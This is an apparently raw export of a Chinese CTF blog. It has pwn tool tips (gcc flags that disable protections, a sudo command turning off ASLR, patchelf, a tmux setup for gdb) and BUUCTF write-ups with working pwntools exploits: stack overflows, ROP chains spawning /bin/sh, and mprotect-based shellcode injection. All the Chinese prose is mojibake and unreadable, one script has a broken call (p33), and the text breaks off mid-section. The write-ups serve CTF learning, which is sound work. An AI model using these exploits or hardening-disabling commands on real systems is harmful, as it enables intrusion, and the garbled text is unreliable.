<h1 id="GCCç¼–è¯‘æŒ‡ä»¤"><a href="#GCCç¼–è¯‘æŒ‡ä»¤" class="headerlink" title="GCCç¼–è¯‘æŒ‡ä»¤"></a>GCCç¼–è¯‘æŒ‡ä»¤</h1><p>gccå„ä¿æŠ¤ç¼–è¯‘æŒ‡ä»¤<br><a href="https://blog.csdn.net/tabactivity/article/details/126660974">https://blog.csdn.net/tabactivity/article/details/126660974</a><br><a href="https://zoepla.github.io/2018/04/gcc%E7%9A%84%E7%BC%96%E8%AF%91%E5%85%B3%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E5%BC%80%E5%90%AF%E7%9A%84%E9%80%89%E9%A1%B9/">https://zoepla.github.io/2018/04/gcc%E7%9A%84%E7%BC%96%E8%AF%91%E5%85%B3%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E5%BC%80%E5%90%AF%E7%9A%84%E9%80%89%E9%A1%B9/</a><br>å…¨å¼€</p>
<blockquote>
<p>gcc test.c -o test -z noexecstack -z now -fstack-protector -fpie -pie</p>
</blockquote>
<p>å…¨å…³</p>
<blockquote>
<p> gcc test.c -o test -z execstack -z norelro -fno-stack-protector -no-pie</p>
</blockquote>
<p>sudo sh -c â€œecho 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_spaceâ€å…³é—­ASLR<br>æŠŠ0æ¢æˆ2å°±æ˜¯å¼€å¯</p>
<p>ç¼–è¯‘æ—¶åŠ ä¸Š -m32 å³ç¼–è¯‘æˆ32ä½ç¨‹åº</p>
<p><a href="https://blog.csdn.net/Jason_ZhouYetao/article/details/81606358">https://blog.csdn.net/Jason_ZhouYetao/article/details/81606358</a></p>
<h1 id="å…³äºç¬¦å·è¡¨"><a href="#å…³äºç¬¦å·è¡¨" class="headerlink" title="å…³äºç¬¦å·è¡¨"></a>å…³äºç¬¦å·è¡¨</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readelf binary -p .comment</span><br><span class="line">æˆ–  objdump -s --section=.comment binary</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥æŸ¥çœ‹ç¨‹åºæˆ–ç¼–è¯‘å™¨ç‰ˆæœ¬</p>
<p>readelfï¼Œobjdumpï¼Œå»ç¬¦å·è¡¨ï¼Œæ¢å¤ç¬¦å·è¡¨<br>ä¸Šé“¾æ¥<br><a href="https://blog.csdn.net/edonlii/article/details/8779075">readelf</a><br><a href="https://blog.csdn.net/qq_41683305/article/details/105375214">objdump</a><br><a href="https://xuanxuanblingbling.github.io/ctf/tools/2019/09/06/symbol/">å»ç¬¦å·è¡¨</a><br><a href="https://loora1n.github.io/2022/11/01/%E3%80%90%E7%A5%A5%E4%BA%91%E6%9D%AF2022%E3%80%91PWN-WriteUp-protocol/">æ¢å¤ç¬¦å·è¡¨</a></p>
<h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><p>patchefå››éƒ¨æ›²</p>
<p>ldd  binary<br>åˆ—å‡ºåŠ¨æ€åº“ä¾èµ–</p>
<p>strings é¢˜ç›®ç»™çš„libcå | grep ubuntu<br>å¿«é€Ÿæ‰¾åˆ°Libcæ–‡ä»¶å¯¹åº”ç‰ˆæœ¬</p>
<p>ï¼ˆcp æƒ³æ›¿æ¢çš„æ–‡ä»¶åˆ°èµ›é¢˜ç›®å½•ï¼‰</p>
<p>patchelf â€“set-interpreter .&#x2F;ld-2.27.so .&#x2F;binary<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”å¯¹åº”çš„ldæ–‡ä»¶â€”-pwnæ–‡ä»¶</p>
<p>patchelf â€“replace-needed libc.so.6 .&#x2F;libc-2.27.so .&#x2F;binary<br>â€”â€”â€”â€”â€”â€”â€”â€”-åŸæœ¬çš„libcâ€”-è¦æ›¿æ¢çš„libcâ€”â€“pwnæ–‡ä»¶       </p>
<p>ï¼ˆè‹¥åªç”¨ä¸Šè¿°å‘½ä»¤ç¢°åˆ°å¦‚ä¸‹æŠ¥é”™æ—¶ï¼‰<br><img data-src="https://github.com/lmarch2/images/blob/main/typora/202308012217243.png?raw=true"><br>patchelf â€“replace-needed libpthread.so.0 .&#x2F;libpthread-2.31.so .&#x2F;binary<br> â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“åŸæœ¬çš„     â€”â€”â€”   è¦æ›¿æ¢çš„</p>
<p>Linuxå‘½ä»¤    </p>
<p>pwd ï¼šè·å–å½“å‰æ‰€åœ¨ç›®å½•è·¯å¾„<br>realpath file : è·å–æ–‡ä»¶åœ°å€</p>
<p>pip listæŸ¥çœ‹å·²å®‰è£…åŒ…<br>pip show åŒ…å æŸ¥çœ‹åŒ…å®‰è£…è·¯å¾„</p>
]]></content>
      <categories>
        <category>å®ç”¨å·¥å…·</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2ä¸‹ä¸èƒ½ä½¿ç”¨gdb.attachçš„è§£å†³æ–¹æ¡ˆ</title>
    <url>/posts/19b7c9d1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>pwndbgåœ¨WSLä¸‹ä¸€ç›´æ²¡æ³•ä½¿ç”¨ä¸‹æ–­ç‚¹è°ƒè¯•çš„åŠŸèƒ½ï¼Œæ‰¾äº†åŠå¤©å‘ç°tmuxå¯ä»¥å¸®åŠ©è§£å†³è¿™ä¸ªé—®é¢˜</p>
<span id="more"></span>

<h2 id="å®‰è£…tmux"><a href="#å®‰è£…tmux" class="headerlink" title="å®‰è£…tmux"></a>å®‰è£…tmux</h2><p>ç”¨rootæƒé™å®‰è£…</p>
<blockquote>
<p>sudo apt-get install tmux</p>
</blockquote>
<p>è¿›å…¥æ ¹ç›®å½•</p>
<blockquote>
<p>cd ~</p>
</blockquote>
<h2 id="ç¼–è¾‘é…ç½®"><a href="#ç¼–è¾‘é…ç½®" class="headerlink" title="ç¼–è¾‘é…ç½®"></a>ç¼–è¾‘é…ç½®</h2><p>ä½¿ç”¨rootæƒé™æ‰“å¼€tmuxï¼Œæ–¹ä¾¿ä¿å­˜é…ç½®æ–‡ä»¶</p>
<blockquote>
<p>sudo tmux</p>
</blockquote>
<p>æ–°å»º.tmux.confæ–‡ä»¶</p>
<blockquote>
<p>vim .tmux.conf</p>
</blockquote>
<p>åœ¨æ–‡ä»¶ä¸­è¾“å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#è¾“å…¥</span><br><span class="line">bind-key c new-window -c &quot;#&#123;pane_current_path&#125;&quot;</span><br><span class="line">bind-key % split-window -h -c &quot;#&#123;pane_current_path&#125;&quot;</span><br><span class="line">bind-key &#x27;&quot;&#x27; split-window -c &quot;#&#123;pane_current_path&#125;&quot;</span><br><span class="line">set -g mouse on</span><br></pre></td></tr></table></figure>

<p>å…³é—­æ‰€æœ‰tmuxçª—å£å¹¶è¾“å…¥</p>
<blockquote>
<p>tmux source-file ~&#x2F;.tmux.conf</p>
</blockquote>
<p>é‡æ–°å¯åŠ¨tmuxåˆ™å®Œæˆæ›´æ”¹ã€</p>
<h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>æ¥ä¸‹æ¥å¯ä»¥åœ¨expä¸­ä¸‹æ–­ç‚¹äº†  <code>gdb.attach(p)</code></p>
<p>åŒæ—¶è¦åœ¨expä¸­åŠ ä¸ŠæŒ‡å®šterminal</p>
<blockquote>
<p>context.terminal &#x3D; [â€˜tmuxâ€™, â€˜splitwâ€™, â€˜-hâ€™]</p>
</blockquote>
<p>-hä»£è¡¨æ¨ªå‘åˆ†å±</p>
<p>ä¹‹åå°±å¯ä»¥åœ¨è¿è¡Œexpæ—¶debug</p>
<p>æ³¨æ„è¦åœ¨tmuxç»ˆç«¯ä¸‹è¿è¡Œ</p>
]]></content>
      <categories>
        <category>å·¥å…·æŠ€å·§</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <url>/posts/de339b6d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>æ¬è¿ï¼ŒBUUCTFçš„pwnéƒ¨åˆ†é¢˜è§£</p>
<span id="more"></span>

<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><h2 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h2><p>å’Œget_started_3dsctf_2016ç±»ä¼¼</p>
<p><img data-src="https://picx.zhimg.com/80/v2-c4b46ac8776ff52321e4e0dc72bae1fb_720w.png"></p>
<p><img data-src="https://picx.zhimg.com/80/v2-95401165e52d6ae447f905feb55371c3_720w.png"></p>
<p><img data-src="https://picx.zhimg.com/80/v2-d1cebe3985838041d6c2f820cb06311a_720w.png"></p>
<p>å¤§æ¦‚æ€è·¯æ˜¯å…ˆæ§åˆ¶ç¨‹åºæµåˆ°get_secretå‡½æ•°è¯»å–flagåˆ°f14gå˜é‡ï¼Œå†æ§åˆ¶è¿”å›åœ°å€ä¸ºwriteå‡½æ•°è¾“å‡ºf14gå˜é‡çš„å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25684</span>)</span><br><span class="line"></span><br><span class="line">elf= ELF(./not_the_same_3dsctf_2016)</span><br><span class="line"></span><br><span class="line">write_addr = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span> </span><br><span class="line">get_secret = <span class="number">0x080489A0</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>* <span class="number">0x2d</span> + p32(get_secret) + p32(write_addr) + p32(<span class="number">0</span>) + p32(<span class="number">1</span>) + p32(flag_addr) + p32(<span class="number">45</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>ç¬¬äºŒç§æ€è·¯</p>
<p>ç”¨mprotectå‡½æ•°ä¿®æ”¹.plt.gotè¡¨å†…å­˜é¡µæƒé™ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç”¨readå‡½æ•°å°†shellcodeæ³¨å…¥åˆ°åˆšæ‰ä¿®æ”¹çš„å†…å­˜é¡µä¸­ï¼Œæ‰§è¡Œshellcode  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25684</span>)</span><br><span class="line"></span><br><span class="line">elf= ELF(./not_the_same_3dsctf_2016)</span><br><span class="line">pop3_ret = <span class="number">0x0804f420</span><span class="comment">#gadget:pop ebx; pop esi; pop ebp; ret;ç”¨æ¥å‘mprotect()ã€read()ä¼ å‚</span></span><br><span class="line">				     <span class="comment">#ROPgadget --binary get_started --only &#x27;pop|ret&#x27; | grep pop</span></span><br><span class="line"><span class="comment">#ä¸ºäº†åç»­å†èƒ½ä½¿ç”¨æ ˆret,æˆ‘ä»¬å¾—æ„é€ ä¸€ä¸‹æ ˆçš„å¸ƒå±€,å› ä¸ºmprotectå‡½æ•°ä½¿ç”¨åˆ°äº†3ä¸ªå‚æ•°,æˆ‘ä»¬å°±æ‰¾å­˜åœ¨3ä¸ªè¿ç»­popçš„æŒ‡ä»¤ï¼Œä¸ºå•¥è¦æ‰¾3ä¸ªpop,ä¹Ÿå°±æ˜¯åœ¨æ­£å¸¸æƒ…å†µä¸‹,å‡½æ•°ä¼ å‚æ˜¯ä½¿ç”¨pushï¼Œæ‰€ä»¥è¦ä¸ºäº†å †æ ˆè¿˜åŸ,å‡½æ•°è°ƒç”¨ç»“æŸæ—¶å°±ä½¿ç”¨popæ¥ä¿è¯å †æ ˆå®Œå¥½.</span></span><br><span class="line"></span><br><span class="line">mem_addr = <span class="number">0x80eb000</span> <span class="comment">#å¯è¯»å¯å†™çš„å†…å­˜,ä½†ä¸å¯æ‰§è¡Œ</span></span><br><span class="line">mem_size = <span class="number">0x1000</span>    <span class="comment">#é€šè¿‡è°ƒè¯•å‡ºæ¥çš„å€¼</span></span><br><span class="line">mem_proc = <span class="number">0x7</span>       <span class="comment">#å¯ä»£è¡¨å¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ä¸ºäº†è¿ç»­åœ¨å †æ ˆä¸­æ‰§è¡Œ,å°±æ˜¯ç”¨pop3_retæ¥æ§åˆ¶esp,ä½¿å®ƒå¾€ä¸‹å¼¹æ‰å·²ç”¨çš„3ä¸ªå€¼.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">45</span> <span class="comment">#å¡«å……æ•°æ®è¦†ç›–åˆ°ebp</span></span><br><span class="line">payload += p32(mprotect_addr) <span class="comment">#æ ˆè¿”å›åˆ°mprotect()å‡½æ•°æ‰§è¡Œ</span></span><br><span class="line">payload += p32(pop3_ret) <span class="comment">#æ‰§è¡Œå®Œmprotectçš„è¿”å›åœ°å€,ä½¿espå¾€ä¸‹+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mprotect çš„ä¸‰ä¸ªå‚æ•° mprotect(0x080ea000,0x1000,0x7)</span></span><br><span class="line">payload += p32(mem_addr)   <span class="comment">#mprotectå‡½æ•°å‚æ•°1 ä¿®æ”¹çš„å†…å­˜åœ°å€</span></span><br><span class="line">payload += p32(mem_size)   <span class="comment">#mprotectå‡½æ•°å‚æ•°2 ä¿®æ”¹çš„å†…å­˜å¤§å°</span></span><br><span class="line">payload += p32(mem_proc)   <span class="comment">#mprotectå‡½æ•°å‚æ•°3 ä¿®æ”¹çš„æƒé™</span></span><br><span class="line"></span><br><span class="line">payload += p32(read_addr) <span class="comment">#æ‰§è¡Œå®Œpop3_retåå¼¹åˆ°readåœ°å€</span></span><br><span class="line">payload += p32(pop3_ret)  <span class="comment">#æ‰§è¡Œå®Œreadåå°†è¿”å›åˆ°pop3_retæŒ‡ä»¤,åˆç»§ç»­ä½¿esp+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read çš„ä¸‰ä¸ªå‚æ•° read(0,0x080ea000,0x100)</span></span><br><span class="line">payload += p32(<span class="number">0</span>)     <span class="comment">#readå‡½æ•°å‚æ•°1 ,ä»è¾“å…¥ç«¯è¯»å–ï¼Œå°†æˆ‘ä»¬ç”Ÿæˆçš„shellcodeè¯»å…¥ç›®æ ‡å†…å­˜åœ°å€</span></span><br><span class="line">payload += p32(mem_addr)   <span class="comment">#è¯»å–åˆ°çš„å†…å®¹å¤åˆ¶åˆ°æŒ‡å‘çš„å†…å­˜é‡Œ</span></span><br><span class="line">payload += p32(<span class="number">0x100</span>) <span class="comment">#è¯»å–å¤§å°</span></span><br><span class="line"></span><br><span class="line">payload += p32(mem_addr)   <span class="comment">#æ‰§è¡Œå®Œreadåret esiï¼Œè¿™é‡Œæ˜¯è¿”å›åˆ°æˆ‘ä»¬å¸ƒç½®çš„shellcodeæ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">payload_shellcode = asm(shellcraft.sh(),arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">sh.sendline(payload_shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p><img data-src="https://picx.zhimg.com/80/v2-b841ab9925da5fda5c194a34fe90e6ab_720w.png"></p>
<p>åªéœ€è¦æ»¡è¶³<code>var[13] == 17</code>å³å¯getshellï¼›__isoc99_scanf()&#96;å‡½æ•°æ²¡æœ‰é™åˆ¶è¾“å…¥æ•°æ®çš„é•¿åº¦</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25951</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>*<span class="number">13</span> + p32(<span class="number">17</span>) <span class="comment">#p32(17)=\x11\x00\x00\x00,16è¿›åˆ¶å°ç«¯å­˜å‚¨ï¼Œ0x11(16)=17(10)</span></span><br><span class="line"><span class="comment">#è¿™é‡Œ*4æ˜¯å› ä¸º4å­—èŠ‚çš„æ•°ç»„æ¯ä¸€é¡¹è¦4å­—èŠ‚æ‰èƒ½å¡«æ»¡ï¼Œ*13æ˜¯æŠŠæ•°ç»„å‰13é¡¹å¡«æ»¡ï¼Œç¬¬14é¡¹ç”¨</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>æœ€è¿‘æŒç»­å­¦ä¹ æ ˆæº¢å‡ºï¼ŒåŠªåŠ›ç†Ÿæ‚‰å„ç§åˆ©ç”¨æ–¹æ³•ï¼Œäº‰å–è¿™å‘¨å’Œä¸‹å‘¨æŠŠæ ˆæº¢å‡ºè¿™å—ç»“æŸ</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>IDAåˆ†æ</p>
<p><img data-src="http://a1.qpic.cn/psc?/V11A9QHl1NNOpd/05RlWl8gsTOH*Z17MtCBzK03nLoC8PsZaXeSN56liOsd4c*DCOl3E.KMQgiJHI7btXhUypGiZ44CEh2X3SWvZw!!/c&ek=1&kp=1&pt=0&bo=fwLCAH8CwgAWADA!&tl=1&tm=1690290000&dis_t=1690293206&dis_k=f26da0996afa3b0e0c7c761a1dbac217&sce=0-12-12&rf=0-18"></p>
<p><img data-src="https://pic1.zhimg.com/80/v2-8c3972c8d716c5b403ee61aa7a6124af_720w.png?source=d16d100b"></p>
<p>&#96;&#96;<img data-src="https://picx.zhimg.com/80/v2-6546c4a99abf8ae111647ea8e5531456_720w.png"></p>
<p>æ–¹æ³•ä¸€ï¼šä¼ ç»Ÿæ ˆæº¢å‡º</p>
<p>å¯ä»¥çœ‹åˆ°mainå‡½æ•°å¹¶æ²¡æœ‰ebpï¼Œå¯»å€æ–¹å¼æ˜¯espå¯»å€ </p>
<p>get_flagå‡½æ•°ä¸­ï¼Œåœ¨è¯»å–flagä¹‹å‰å…ˆç»è¿‡ifåˆ¤æ–­a1 &#x3D;&#x3D; 814536271 &amp;&amp; a2 &#x3D;&#x3D; 425138641</p>
<p>æ„é€ payæ—¶ä¸å¯ä»¥è¯•å›¾è·³è¿‡è¿™ä¸ªåˆ¤æ–­ï¼Œæ— æ³•æ‰“é€š</p>
<p>è¿”å›åœ°å€ä¸€å®šè¦è¦†ç›–ä¸ºget_flagå‡½æ•°çš„å¼€å§‹å¤„</p>
<p>åœ¨æ ˆä¸Šæ„é€ get_flagå‚æ•°</p>
<blockquote>
<p>payload &#x3D; bâ€™aâ€™ * 0x38+p32(get_flag_addr)+p32(exit_addr)+p32(a1)+p32(a2)</p>
<p>æ³¨æ„è¿™é‡Œçš„è¿”å›åœ°å€ä¸ºexitçš„åœ°å€ï¼Œæ‰“è¿œç¨‹æ—¶ï¼Œå¦‚æœç¨‹åºæ˜¯å¼‚å¸¸é€€å‡ºäº†ï¼Œæœ€åæ˜¯ä¸ç»™ä½ å›æ˜¾çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¾—æƒ³åŠæ³•è®©ç¨‹åºæ­£å¸¸é€€å‡º </p>
</blockquote>
<p>EXP1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25669</span>)</span><br><span class="line"></span><br><span class="line">get_flag_addr = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x804E6A0</span></span><br><span class="line">a1 = <span class="number">0x308CD64F</span></span><br><span class="line">a2 = <span class="number">0x195719D1</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>+p32(get_flag_addr)+p33(exit_addr)+p32(a1)+p32(a2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>æ–¹æ³•äºŒï¼šç³»ç»Ÿè°ƒç”¨</p>
<p>åˆ©ç”¨ROPgadgetæ‰¾åˆ°éœ€è¦çš„gadget</p>
<p><code>pop_eax_ret = 0x080b91e6</code></p>
<p><code>pop_edx_ecx_ebx_ret = 0x0806fc30</code></p>
<p><code>int80 = 0x0806d7e5</code></p>
<p>ä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°â€&#x2F;bin&#x2F;shâ€å­—ç¬¦ä¸²ï¼Œè€ƒè™‘åœ¨å…¶ä»–å¯„å­˜å™¨å†™å…¥&#x2F;bin&#x2F;shï¼Œå†èµ‹å€¼ç»™edx</p>
<p>çœ‹çœ‹æœ‰æ²¡æœ‰ç±»ä¼¼çš„movæŒ‡ä»¤</p>
<p><code>mov_edx_eax_ret = 0x080557ab</code></p>
<p><del>ä½ çŒœçŒœæˆ‘mov_edx_eax_retæ€ä¹ˆæ‰¾çš„ï¼ˆè£‚å¼€ï¼‰</del></p>
<p><img data-src="https://picx.zhimg.com/80/v2-21ea8eba239f70d3814cc987604f6b83_720w.png"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¯¥å¤„æŒ‡ä»¤<code>mov    [edx], eax</code> æ˜¯å°†eaxå¯„å­˜å™¨é‡Œçš„å€¼å†™åˆ°eedxæ‰€å­˜çš„åœ°å€å¤„[edx]ï¼Œæ”»å‡»çš„æ€è·¯å°±æ˜¯è®²[edx]åœ°å€è¦†ç›–ä¸º&#x2F;bin&#x2F;shå†™å…¥åœ°å€ï¼Œå¹¶åˆ©ç”¨eaxå¯„å­˜å™¨å°†å­—ç¬¦ä¸²&#x2F;bin&#x2F;shå­˜å…¥ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯¥ç¨‹åºæ²¡æœ‰ç»™å‡ºå¯ç”¨çš„bssæ®µå˜é‡ï¼Œæ ˆç©ºé—´ä¸€èˆ¬æƒ…å†µä¸‹å¼€å¯ASLRåœ°å€éšæœºï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨vmmapæŸ¥æ‰¾å¯è¯»çš„å†…å­˜ç©ºé—´ä½œä¸ºå…¥&#x2F;bin&#x2F;shçš„åœ°å€</p>
<p><a href="https://www.shawroot.cc/2010.html">è¿™ç¯‡å‚è€ƒçš„é“¾æ¥</a>ï¼Œä½¿ç”¨0x080eb020 ä½œä¸ºå­˜æ”¾&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œä½†æ˜¯ä½¿ç”¨vmmapå¯ä»¥çœ‹åˆ°æ²¡æœ‰ä»¥è¿™ä¸ªåœ°å€å¼€å¤´æˆ–ç»“æŸçš„æ®µï¼Œè€Œä¸”ä¹Ÿä¸å­˜åœ¨å¯å†™å¯æ‰§è¡Œçš„æ®µï¼Œåªæœ‰0x80ea000åˆ°0x80ec000æ˜¯å¯å†™çš„æ–‡ä»¶æ®µï¼ˆå®é™…ä¸Š0x080eb020 ä¹Ÿåœ¨è¯¥æ®µä¸­ï¼‰</p>
<p>è¡¥å……ä¸€ä¸‹ï¼ŒåŒæ—¶å…¶å®æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥vmmapå‡ºæ¥çš„åœ°å€æ®µæ˜¯æ²¡æœ‰libcä¸­çš„å†…å®¹çš„ï¼Œå®é™…ä¸Šget_started_3dsctf_2016æ˜¯é™æ€é“¾æ¥</p>
<p><img data-src="https://pic4.zhimg.com/80/v2-3f0871a35e36bb1b4168d14429be1647_720w.webp"></p>
<p><img data-src="https://pic1.zhimg.com/80/v2-262a105cb813d69dda9de13c35a7ecc0_720w.png"></p>
<p><img data-src="https://pica.zhimg.com/80/v2-8eb67977ab589ae1dff2debc6163b811_720w.png"></p>
<p>æ•´ä½“çš„ropæµç¨‹ä¸ºï¼Œåˆ†ä¸¤æ¬¡æ¯æ¬¡å››å­—èŠ‚å°†â€&#x2F;binâ€ â€œ&#x2F;sh\x00â€å…ˆå­˜å…¥eaxï¼Œå†åˆ©ç”¨Popå°†edxç½®ä¸º0x80ea000ï¼Œå†åˆ©ç”¨movæŒ‡ä»¤å°†å­—ç¬¦ä¸²æ”¾å…¥è¯¥åœ°å€æŒ‡å‘ç©ºé—´ï¼Œæœ€åè¿”å›ç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25878</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b91e6</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806fc30</span></span><br><span class="line">int80 = <span class="number">0x0806d7e5</span></span><br><span class="line">mov_edx_eax_ret = <span class="number">0x080557ab</span></span><br><span class="line">w_addr = <span class="number">0x80ea000</span><span class="comment">#0x080eb020</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p32(pop_eax_ret)+<span class="string">b&#x27;/bin&#x27;</span>+p32(pop_edx_ecx_ebx_ret)+p32(w_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(mov_edx_eax_ret)</span><br><span class="line">payload += p32(pop_eax_ret)+<span class="string">b&#x27;/sh\x00&#x27;</span>+p32(pop_edx_ecx_ebx_ret)+p32(w_addr+<span class="number">4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(mov_edx_eax_ret)</span><br><span class="line">payload += p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(w_addr)+p32(int80)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">~                              </span><br></pre></td></tr></table></figure>



<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>æ–¹æ³•ä¸‰ï¼šmprotectå‡½æ•°ä¿®æ”¹åœ°å€æƒé™</p>
<p>åˆ©ç”¨mprotect()å‡½æ•°æ¥ä¿®æ”¹å†…å­˜æƒé™ï¼Œä¸€èˆ¬æ˜¯å°†.bssç«¯ä¿®æ”¹ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç„¶åé€šè¿‡read()å‡½æ•°å‘ç›®æ ‡å†…å­˜å†™å…¥shellcodeï¼Œç„¶ågetshell ï¼ˆå› ä¸ºæ˜¯é™æ€é“¾æ¥çš„ï¼Œæ‰€æœ‰çš„å‡½æ•°éƒ½ä¼šé“¾æ¥åˆ°ç¨‹åºï¼Œè‚¯å®šä¼šå­˜åœ¨ä¸€ä¸ªmprotectï¼ˆï¼‰å‡½æ•° ï¼‰</p>
<p><img data-src="https://picx.zhimg.com/80/v2-6dbdaad88cfe982d0518d899ad3491db_720w.png"></p>
<blockquote>
<p>include &lt;sys&#x2F;mman.h&gt; </p>
